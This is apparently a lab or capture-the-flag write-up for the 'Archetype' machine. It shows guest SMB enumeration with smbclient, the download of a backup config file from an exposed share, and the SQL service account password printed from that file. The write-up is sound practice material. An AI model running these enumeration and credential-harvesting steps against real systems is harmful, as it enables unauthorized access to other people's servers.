
## Unauthenticated

Nmap showed that SMB allows guest access
```
┌──(kali㉿kali)-[~]
└─$ smbclient -L //10.129.47.24 -U guest        
Password for [WORKGROUP\guest]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.47.24 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

## Accessing backups share
```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.129.47.24/backups -U guest 
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
```

Inspecting the prod.dtsConfig file
```
┌──(kali㉿kali)-[~]
└─$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>  
```

Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc
